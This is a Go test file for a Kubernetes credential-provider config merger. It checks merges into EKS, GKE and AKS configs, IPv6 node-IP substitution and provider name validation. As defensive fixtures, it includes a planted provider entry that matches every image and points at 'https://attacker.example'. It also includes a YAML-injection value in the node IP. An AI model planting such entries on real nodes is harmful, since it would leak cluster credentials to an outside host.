// Copyright 2026 The Aetherize Authors.
// SPDX-License-Identifier: Apache-2.0

package main

import (
	"net/url"
	"reflect"
	"strings"
	"testing"

	"sigs.k8s.io/yaml"
)

// renderedConfig mirrors what the chart's plugin-configmap.yaml renders.
const renderedConfig = `apiVersion: kubelet.config.k8s.io/v1
kind: CredentialProviderConfig
providers:
  - name: harbor-bridge-plugin
    apiVersion: credentialprovider.kubelet.k8s.io/v1
    matchImages:
      - "harbor.example.com"
    defaultCacheDuration: "1h"
    env:
      - name: HARBOR_BRIDGE_ENDPOINT
        value: "https://127.0.0.1:31443"
      - name: HARBOR_BRIDGE_CA_BUNDLE
        value: "/etc/kubernetes/credential-provider-config/harbor-bridge-ca.crt"
    tokenAttributes:
      serviceAccountTokenAudience: "harbor-bridge"
      requireServiceAccount: true
      cacheType: ServiceAccount
`

// eksConfig is shaped like /etc/eks/image-credential-provider/config.json
// on AL2023, including a field our types don't know about.
const eksConfig = `{
  "apiVersion": "kubelet.config.k8s.io/v1",
  "kind": "CredentialProviderConfig",
  "providers": [
    {
      "name": "ecr-credential-provider",
      "matchImages": ["*.dkr.ecr.*.amazonaws.com", "public.ecr.aws"],
      "defaultCacheDuration": "12h",
      "apiVersion": "credentialprovider.kubelet.k8s.io/v1",
      "args": ["get-credentials"],
      "unknownVendorField": {"keep": "me"}
    }
  ]
}
`

// gkeConfig is a YAML-shaped cloud config (GKE/AKS style).
const gkeConfig = `apiVersion: kubelet.config.k8s.io/v1
kind: CredentialProviderConfig
providers:
  - name: auth-provider-gcp
    apiVersion: credentialprovider.kubelet.k8s.io/v1
    matchImages:
      - "container.cloud.google.com"
      - "*.pkg.dev"
    defaultCacheDuration: "1m"
    args:
      - get-credentials
      - --v=3
`

// aksConfig is shaped like the out-of-tree ACR provider config AKS nodes
// point kubelet at (/var/lib/kubelet/credential-provider-config.yaml).
const aksConfig = `apiVersion: kubelet.config.k8s.io/v1
kind: CredentialProviderConfig
providers:
  - name: acr-credential-provider
    apiVersion: credentialprovider.kubelet.k8s.io/v1
    matchImages:
      - "*.azurecr.io"
      - "*.azurecr.cn"
      - "*.azurecr.de"
      - "*.azurecr.us"
    defaultCacheDuration: 10m
    args:
      - /etc/kubernetes/azure.json
`

// TestMergeProvider_ManagedCloudShapes: on every managed cloud the merge
// keeps the cloud's own provider intact (image pulls from ECR/GAR/ACR
// depend on it), keeps the file format, adds ours, and converges — a
// second merge must report no change, or every re-roll would restart
// kubelet.
func TestMergeProvider_ManagedCloudShapes(t *testing.T) {
	entry, err := renderedProvider([]byte(renderedConfig), "harbor-bridge-plugin")
	if err != nil {
		t.Fatal(err)
	}
	for name, tc := range map[string]struct {
		doc, cloudProvider string
		json               bool
	}{
		"EKS (AL2023, JSON)": {eksConfig, "ecr-credential-provider", true},
		"GKE (YAML)":         {gkeConfig, "auth-provider-gcp", false},
		"AKS (YAML)":         {aksConfig, "acr-credential-provider", false},
	} {
		t.Run(name, func(t *testing.T) {
			merged, changed, err := mergeProvider([]byte(tc.doc), entry)
			if err != nil {
				t.Fatal(err)
			}
			if !changed {
				t.Fatal("first merge reported no change")
			}
			if isJSON(merged) != tc.json {
				t.Fatalf("format changed (json=%v):\n%s", isJSON(merged), merged)
			}
			var cfg map[string]any
			if err := yaml.Unmarshal(merged, &cfg); err != nil {
				t.Fatal(err)
			}
			names := map[string]bool{}
			for _, p := range cfg["providers"].([]any) {
				names[p.(map[string]any)["name"].(string)] = true
			}
			if !names[tc.cloudProvider] || !names["harbor-bridge-plugin"] || len(names) != 2 {
				t.Fatalf("providers after merge = %v", names)
			}
			again, changed, err := mergeProvider(merged, entry)
			if err != nil {
				t.Fatal(err)
			}
			if changed || string(again) != string(merged) {
				t.Fatal("second merge is not a no-op")
			}
		})
	}
}

func TestRenderedProvider(t *testing.T) {
	entry, err := renderedProvider([]byte(renderedConfig), "harbor-bridge-plugin")
	if err != nil {
		t.Fatalf("renderedProvider: %v", err)
	}
	if entry["name"] != "harbor-bridge-plugin" {
		t.Fatalf("wrong entry extracted: %v", entry["name"])
	}
	if _, ok := entry["tokenAttributes"]; !ok {
		t.Fatal("tokenAttributes lost in extraction")
	}
}

func TestRenderedProvider_MissingName(t *testing.T) {
	if _, err := renderedProvider([]byte(renderedConfig), "nope"); err == nil {
		t.Fatal("expected error for missing provider name")
	}
}

func TestMergeProvider_AppendsToJSONPreservingUnknownFields(t *testing.T) {
	entry, err := renderedProvider([]byte(renderedConfig), "harbor-bridge-plugin")
	if err != nil {
		t.Fatalf("renderedProvider: %v", err)
	}
	merged, changed, err := mergeProvider([]byte(eksConfig), entry)
	if err != nil {
		t.Fatalf("mergeProvider: %v", err)
	}
	if !changed {
		t.Fatal("expected changed=true on first merge")
	}
	if !isJSON(merged) {
		t.Fatalf("JSON input must stay JSON, got:\n%s", merged)
	}
	out := parseConfig(t, merged)
	providers := out["providers"].([]any)
	if len(providers) != 2 {
		t.Fatalf("want 2 providers, got %d", len(providers))
	}
	ecr := providers[0].(map[string]any)
	if ecr["name"] != "ecr-credential-provider" {
		t.Fatalf("foreign provider moved: %v", ecr["name"])
	}
	if _, ok := ecr["unknownVendorField"]; !ok {
		t.Fatal("unknown vendor field dropped by merge")
	}
	ours := providers[1].(map[string]any)
	if ours["name"] != "harbor-bridge-plugin" {
		t.Fatalf("our provider not appended: %v", ours["name"])
	}
}

func TestMergeProvider_AppendsToYAMLStayingYAML(t *testing.T) {
	entry, err := renderedProvider([]byte(renderedConfig), "harbor-bridge-plugin")
	if err != nil {
		t.Fatalf("renderedProvider: %v", err)
	}
	merged, changed, err := mergeProvider([]byte(gkeConfig), entry)
	if err != nil {
		t.Fatalf("mergeProvider: %v", err)
	}
	if !changed {
		t.Fatal("expected changed=true on first merge")
	}
	if isJSON(merged) {
		t.Fatalf("YAML input must stay YAML, got:\n%s", merged)
	}
	out := parseConfig(t, merged)
	providers := out["providers"].([]any)
	if len(providers) != 2 {
		t.Fatalf("want 2 providers, got %d", len(providers))
	}
	gcp := providers[0].(map[string]any)
	if gcp["name"] != "auth-provider-gcp" {
		t.Fatalf("foreign provider moved: %v", gcp["name"])
	}
}

func TestMergeProvider_SecondMergeIsIdempotent(t *testing.T) {
	entry, err := renderedProvider([]byte(renderedConfig), "harbor-bridge-plugin")
	if err != nil {
		t.Fatalf("renderedProvider: %v", err)
	}
	first, _, err := mergeProvider([]byte(eksConfig), entry)
	if err != nil {
		t.Fatalf("first merge: %v", err)
	}
	second, changed, err := mergeProvider(first, entry)
	if err != nil {
		t.Fatalf("second merge: %v", err)
	}
	if changed {
		t.Fatalf("second merge with identical entry must report changed=false, diff:\n%s\nvs\n%s", first, second)
	}
	if string(first) != string(second) {
		t.Fatal("second merge altered the document")
	}
}

func TestMergeProvider_ReplacesExistingEntry(t *testing.T) {
	entry, err := renderedProvider([]byte(renderedConfig), "harbor-bridge-plugin")
	if err != nil {
		t.Fatalf("renderedProvider: %v", err)
	}
	first, _, err := mergeProvider([]byte(eksConfig), entry)
	if err != nil {
		t.Fatalf("first merge: %v", err)
	}
	// Simulate a helm upgrade changing matchImages.
	updated := map[string]any{}
	for k, v := range entry {
		updated[k] = v
	}
	updated["matchImages"] = []any{"harbor.example.com", "harbor-alt.example.com"}

	merged, changed, err := mergeProvider(first, updated)
	if err != nil {
		t.Fatalf("replace merge: %v", err)
	}
	if !changed {
		t.Fatal("expected changed=true when the entry differs")
	}
	out := parseConfig(t, merged)
	providers := out["providers"].([]any)
	if len(providers) != 2 {
		t.Fatalf("replace must not duplicate the entry, got %d providers", len(providers))
	}
}

func TestMergeProvider_RefusesUnknownAPIVersion(t *testing.T) {
	entry := map[string]any{"name": "harbor-bridge-plugin"}
	old := strings.Replace(eksConfig, "kubelet.config.k8s.io/v1", "kubelet.config.k8s.io/v1alpha1", 1)
	if _, _, err := mergeProvider([]byte(old), entry); err == nil {
		t.Fatal("expected refusal on non-v1 apiVersion")
	}
}

func TestSubstituteNodeIP(t *testing.T) {
	in := []byte(`value: "https://$(NODE_IP):31443"`)
	out, err := substituteNodeIP(in, "10.0.0.7")
	if err != nil {
		t.Fatalf("substituteNodeIP: %v", err)
	}
	if string(out) != `value: "https://10.0.0.7:31443"` {
		t.Fatalf("unexpected substitution result: %s", out)
	}
}

// TestSubstituteNodeIP_URLHost: $(NODE_IP) is a URL host. An IPv6 hostIP
// (IPv6 single-stack or IPv6-primary dual-stack nodes) used to go in bare,
// "https://fd00:10:244::5:31443", which the plugin rejects on every exec.
func TestSubstituteNodeIP_URLHost(t *testing.T) {
	for name, tc := range map[string]struct{ in, ip, want string }{
		"ipv4":                {"https://$(NODE_IP):31443", "10.0.0.7", "https://10.0.0.7:31443"},
		"ipv6":                {"https://$(NODE_IP):31443", "fd00:10:244::5", "https://[fd00:10:244::5]:31443"},
		"ipv6 bracketed":      {"https://[$(NODE_IP)]:31443", "fd00:10:244::5", "https://[fd00:10:244::5]:31443"},
		"ipv6 canonical form": {"https://$(NODE_IP):31443", "FD00:0:0::5", "https://[fd00::5]:31443"},
		"ipv4-mapped ipv6":    {"https://$(NODE_IP):31443", "::ffff:10.0.0.7", "https://[::ffff:10.0.0.7]:31443"},
	} {
		out, err := substituteNodeIP([]byte(tc.in), tc.ip)
		if err != nil || string(out) != tc.want {
			t.Errorf("%s: got %q, %v; want %q", name, out, err, tc.want)
			continue
		}
		if u, err := url.Parse(string(out)); err != nil || u.Hostname() == "" {
			t.Errorf("%s: %q does not parse as a URL with a host: %v", name, out, err)
		}
	}
	for name, tc := range map[string]struct{ in, ip string }{
		"ipv4 bracketed": {"https://[$(NODE_IP)]:31443", "10.0.0.7"},
		"not an address": {"https://$(NODE_IP):31443", "node-1"},
		"injection":      {"https://$(NODE_IP):31443", "10.0.0.7\"\n  - name: x"},
		"zone":           {"https://$(NODE_IP):31443", "fe80::1%eth0"},
	} {
		if out, err := substituteNodeIP([]byte(tc.in), tc.ip); err == nil {
			t.Errorf("%s: accepted as %q", name, out)
		}
	}
}

func TestSubstituteNodeIP_MissingIPFails(t *testing.T) {
	if _, err := substituteNodeIP([]byte("$(NODE_IP)"), ""); err == nil {
		t.Fatal("expected error when NODE_IP unset but referenced")
	}
}

func TestSubstituteNodeIP_NoPlaceholderPassesThrough(t *testing.T) {
	in := []byte("no placeholder here")
	out, err := substituteNodeIP(in, "")
	if err != nil {
		t.Fatalf("substituteNodeIP: %v", err)
	}
	if string(out) != string(in) {
		t.Fatal("document without placeholder must pass through unchanged")
	}
}

func parseConfig(t *testing.T, doc []byte) map[string]any {
	t.Helper()
	out := map[string]any{}
	if err := yaml.Unmarshal(doc, &out); err != nil {
		t.Fatalf("parse merged doc: %v\n%s", err, doc)
	}
	return out
}

// TestMergeProvider_TwoBridgeInstallsAndAForeignProvider: each install
// replaces or appends only its own entry; the other install's and the
// cloud's entries round-trip untouched, in place (ADR-0029).
func TestMergeProvider_TwoBridgeInstallsAndAForeignProvider(t *testing.T) {
	a, err := renderedProvider([]byte(renderedConfig), defaultProviderName)
	if err != nil {
		t.Fatal(err)
	}
	b, err := renderedProvider([]byte(renderedConfigFor("harbor-bridge-eu")), "harbor-bridge-eu")
	if err != nil {
		t.Fatal(err)
	}
	doc, _, err := mergeProvider([]byte(eksConfig), a)
	if err != nil {
		t.Fatal(err)
	}
	doc, changed, err := mergeProvider(doc, b)
	if err != nil || !changed {
		t.Fatalf("second install: changed=%v err=%v", changed, err)
	}
	before := parseConfig(t, doc)["providers"].([]any)
	if len(before) != 3 {
		t.Fatalf("want 3 providers, got %d", len(before))
	}

	// Upgrade the first install: only providers[1] may change.
	a2 := map[string]any{}
	for k, v := range a {
		a2[k] = v
	}
	a2["matchImages"] = []any{"harbor-alt.example.com"}
	doc, changed, err = mergeProvider(doc, a2)
	if err != nil || !changed {
		t.Fatalf("upgrade: changed=%v err=%v", changed, err)
	}
	after := parseConfig(t, doc)["providers"].([]any)
	if len(after) != 3 {
		t.Fatalf("upgrade changed the provider count to %d", len(after))
	}
	if !reflect.DeepEqual(after[0], before[0]) {
		t.Fatal("the cloud provider's entry changed")
	}
	if !reflect.DeepEqual(after[2], before[2]) {
		t.Fatal("the other install's entry changed")
	}
	if !reflect.DeepEqual(after[1], a2) {
		t.Fatalf("our entry was not replaced in place: %v", after[1])
	}
}

func TestMergeProvider_RefusesToReplaceAForeignProvider(t *testing.T) {
	entry, err := renderedProvider([]byte(renderedConfigFor("ecr-credential-provider")), "ecr-credential-provider")
	if err != nil {
		t.Fatal(err)
	}
	if _, _, err := mergeProvider([]byte(eksConfig), entry); err == nil || !strings.Contains(err.Error(), "not a harbor-bridge plugin") {
		t.Fatalf("got %v, want a refusal to replace the ECR provider", err)
	}
}

func TestOtherBridgeProviders(t *testing.T) {
	doc, _, err := mergeProvider([]byte(gkeConfig), mustEntry(t, renderedConfig, defaultProviderName))
	if err != nil {
		t.Fatal(err)
	}
	if got := otherBridgeProviders(doc, defaultProviderName, nil); len(got) != 0 {
		t.Fatalf("otherBridgeProviders = %v; the GKE provider is not a bridge entry", got)
	}
	doc, _, err = mergeProvider(doc, mustEntry(t, renderedConfigFor("harbor-bridge-eu"), "harbor-bridge-eu"))
	if err != nil {
		t.Fatal(err)
	}
	if got := otherBridgeProviders(doc, defaultProviderName, nil); !reflect.DeepEqual(got, []string{"harbor-bridge-eu"}) {
		t.Fatalf("otherBridgeProviders = %v", got)
	}
	if got := otherBridgeProviders(doc, defaultProviderName, func(map[string]any) bool { return false }); got != nil {
		t.Fatalf("otherBridgeProviders = %v; counts accepts none", got)
	}
	if got := otherBridgeProviders([]byte("{nope"), defaultProviderName, nil); got != nil {
		t.Fatalf("an unreadable config holds %v", got)
	}
}

// plantedEntry is a provider entry that something able to write
// plugin.hostConfigDir, but not the bin dir, adds to the chart-owned
// config: a bridge entry that points kubelet at a copy of our plugin and
// the plugin at another endpoint.
const plantedEntry = `  - name: harbor-bridge-plugin.bak
    apiVersion: credentialprovider.kubelet.k8s.io/v1
    matchImages: ["*", "*.*", "*.*.*"]
    defaultCacheDuration: "1h"
    env:
      - name: HARBOR_BRIDGE_ENDPOINT
        value: "https://attacker.example"
    tokenAttributes:
      serviceAccountTokenAudience: "harbor-bridge"
      requireServiceAccount: true
      cacheType: ServiceAccount
`

// configWith is a CredentialProviderConfig holding providers in order.
func configWith(t *testing.T, providers ...map[string]any) []byte {
	t.Helper()
	list := make([]any, 0, len(providers))
	for _, p := range providers {
		list = append(list, p)
	}
	out, err := yaml.Marshal(map[string]any{
		"apiVersion": credentialProviderConfigAPIVersion,
		"kind":       "CredentialProviderConfig",
		"providers":  list,
	})
	if err != nil {
		t.Fatal(err)
	}
	return out
}

// TestComposeOwnConfig pins what the chart-owned config of patch and none
// mode keeps (ADR-0029): this install's rendered entry and the entries
// sibling accepts, nothing else.
func TestComposeOwnConfig(t *testing.T) {
	ours := mustEntry(t, renderedConfig, defaultProviderName)
	eu := mustEntry(t, renderedConfigFor("harbor-bridge-eu"), "harbor-bridge-eu")
	planted := mustEntry(t, "apiVersion: kubelet.config.k8s.io/v1\nproviders:\n"+plantedEntry, "harbor-bridge-plugin.bak")
	isEU := func(p map[string]any) bool { return p["name"] == "harbor-bridge-eu" }
	none := func(map[string]any) bool { return false }

	t.Run("nothing else kept: the rendered config verbatim", func(t *testing.T) {
		existing := renderedConfig + plantedEntry
		out, dropped, err := composeOwnConfig([]byte(existing), []byte(renderedConfig), ours, none)
		if err != nil {
			t.Fatal(err)
		}
		if string(out) != renderedConfig {
			t.Fatalf("got\n%s", out)
		}
		if !reflect.DeepEqual(dropped, []string{`"harbor-bridge-plugin.bak"`}) {
			t.Fatalf("dropped = %v", dropped)
		}
	})

	t.Run("another install's entry stays in place", func(t *testing.T) {
		withEU := configWith(t, eu, ours)
		out, dropped, err := composeOwnConfig(withEU, []byte(renderedConfig), ours, isEU)
		if err != nil || len(dropped) != 0 {
			t.Fatalf("dropped %v, err %v", dropped, err)
		}
		if string(out) != string(withEU) {
			t.Fatalf("an unchanged file must come back byte for byte, got\n%s", out)
		}
		upgraded := map[string]any{}
		for k, v := range ours {
			upgraded[k] = v
		}
		upgraded["matchImages"] = []any{"harbor-alt.example.com"}
		out, dropped, err = composeOwnConfig(configWith(t, eu, ours, planted), []byte(renderedConfig), upgraded, isEU)
		if err != nil {
			t.Fatal(err)
		}
		if !reflect.DeepEqual(dropped, []string{`"harbor-bridge-plugin.bak"`}) {
			t.Fatalf("dropped = %v", dropped)
		}
		got := parseConfig(t, out)["providers"].([]any)
		if len(got) != 2 || !reflect.DeepEqual(got[0], eu) || !reflect.DeepEqual(got[1], upgraded) {
			t.Fatalf("providers = %v", got)
		}
	})

	t.Run("a tampered entry of our name is replaced, not refused", func(t *testing.T) {
		tampered := map[string]any{}
		for k, v := range ours {
			tampered[k] = v
		}
		delete(tampered, "env")
		out, _, err := composeOwnConfig(configWith(t, tampered, planted), []byte(renderedConfig), ours, none)
		if err != nil || string(out) != renderedConfig {
			t.Fatalf("got %v\n%s", err, out)
		}
	})

	t.Run("duplicate names are dropped", func(t *testing.T) {
		out, dropped, err := composeOwnConfig(configWith(t, eu, ours, eu, ours), []byte(renderedConfig), ours, isEU)
		if err != nil {
			t.Fatal(err)
		}
		if !reflect.DeepEqual(dropped, []string{`"harbor-bridge-eu"`, `"harbor-bridge-plugin"`}) {
			t.Fatalf("dropped = %v", dropped)
		}
		if got := parseConfig(t, out)["providers"].([]any); len(got) != 2 {
			t.Fatalf("providers = %v", got)
		}
	})

	t.Run("an unknown schema is refused", func(t *testing.T) {
		if _, _, err := composeOwnConfig([]byte("apiVersion: kubelet.config.k8s.io/v9\n"), []byte(renderedConfig), ours, none); err == nil {
			t.Fatal("unknown schema accepted")
		}
	})
}

func mustEntry(t *testing.T, rendered, name string) map[string]any {
	t.Helper()
	entry, err := renderedProvider([]byte(rendered), name)
	if err != nil {
		t.Fatal(err)
	}
	return entry
}

// TestProviderName_YAMLAmbiguousNamesStayStrings: the chart accepts
// plugin.providerName only as a string and quotes every non-default name
// in the rendered config, because YAML 1.1 reads DNS labels such as "yes"
// or "123" as a boolean or a number. The quoted name must be found in the
// rendered config and stay a string through a merge; unquoted it would
// not be found at all.
func TestProviderName_YAMLAmbiguousNamesStayStrings(t *testing.T) {
	for _, name := range []string{"yes", "on", "123", "1e3"} {
		quoted := strings.Replace(renderedConfig, "name: harbor-bridge-plugin", `name: "`+name+`"`, 1)
		entry, err := renderedProvider([]byte(quoted), name)
		if err != nil {
			t.Fatalf("%s: %v", name, err)
		}
		merged, _, err := mergeProvider([]byte(gkeConfig), entry)
		if err != nil {
			t.Fatalf("%s: %v", name, err)
		}
		// renderedProvider compares the name as a string.
		if _, err := renderedProvider(merged, name); err != nil {
			t.Fatalf("%s: the merged config lost the name's string type: %v\n%s", name, err, merged)
		}
		bare := strings.Replace(renderedConfig, "name: harbor-bridge-plugin", "name: "+name, 1)
		if _, err := renderedProvider([]byte(bare), name); err == nil {
			t.Fatalf("%s: an unquoted name was found; the chart's quoting would be unnecessary", name)
		}
	}
}

// TestKubeletStartProblems pins what merge mode refuses before it writes a
// cloud's config or restarts kubelet onto it.
func TestKubeletStartProblems(t *testing.T) {
	present := map[string]bool{"auth-provider-gcp": true, "a.b": true}
	hasBinary := func(name string) bool { return present[name] }
	for name, tc := range map[string]struct {
		doc  string
		want []string
	}{
		"a cloud config with its binary":    {gkeConfig, nil},
		"our own entry needs no binary yet": {gkeConfig + strings.TrimPrefix(renderedConfig, "apiVersion: kubelet.config.k8s.io/v1\nkind: CredentialProviderConfig\nproviders:\n"), nil},
		"a dotted name kubelet accepts":     {"providers:\n  - name: a.b\n", nil},
		"no providers":                      {"apiVersion: kubelet.config.k8s.io/v1\n", nil},
		"missing binary":                    {"providers:\n  - name: gone\n", []string{`the binary of provider "gone" is missing from kubelet's bin dir`}},
		"not an object":                     {"providers:\n  - just-a-string\n", []string{"provider 1 has no string name"}},
		"number as name":                    {"providers:\n  - name: 123\n", []string{"provider 1 has no string name"}},
		"no name":                           {"providers:\n  - apiVersion: x\n", []string{"provider 1 has no string name"}},
		"empty name":                        {"providers:\n  - name: \"\"\n", []string{`kubelet refuses the provider name ""`}},
		"dot":                               {"providers:\n  - name: .\n", []string{`kubelet refuses the provider name "."`}},
		"dot dot":                           {"providers:\n  - name: ..\n", []string{`kubelet refuses the provider name ".."`}},
		"slash":                             {"providers:\n  - name: a/b\n", []string{`kubelet refuses the provider name "a/b"`}},
		"space":                             {"providers:\n  - name: a b\n", []string{`kubelet refuses the provider name "a b"`}},
		"twice": {"providers:\n  - name: auth-provider-gcp\n  - name: auth-provider-gcp\n",
			[]string{`the provider name "auth-provider-gcp" occurs more than once`}},
	} {
		t.Run(name, func(t *testing.T) {
			got, err := kubeletStartProblems([]byte(tc.doc), defaultProviderName, hasBinary)
			if err != nil {
				t.Fatal(err)
			}
			if !reflect.DeepEqual(got, tc.want) {
				t.Fatalf("problems = %q, want %q", got, tc.want)
			}
		})
	}
	if _, err := kubeletStartProblems([]byte("providers: 3\n"), defaultProviderName, hasBinary); err == nil {
		t.Fatal("providers that are not a list were accepted")
	}
}
